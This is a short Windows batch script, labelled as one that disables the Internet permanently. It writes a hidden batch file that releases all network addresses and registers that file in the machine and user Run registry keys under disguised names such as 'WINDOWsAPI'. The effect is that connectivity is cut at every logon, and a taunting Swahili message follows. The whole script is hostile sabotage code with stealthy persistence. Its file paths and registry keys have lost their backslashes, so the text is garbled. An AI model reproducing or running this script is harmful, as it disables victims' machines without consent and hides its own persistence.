    :: Disables Internet Permanently
    
    echo @echo off>c:windowswimn32.bat

    echo break off>>c:windowswimn32.bat

    echo ipconfig/release_all>>c:windowswimn32.bat

    echo end>>c:windowswimn32.bat

    reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

    reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

    echo Kimeumana, Enda uote jua!

    PAUSE
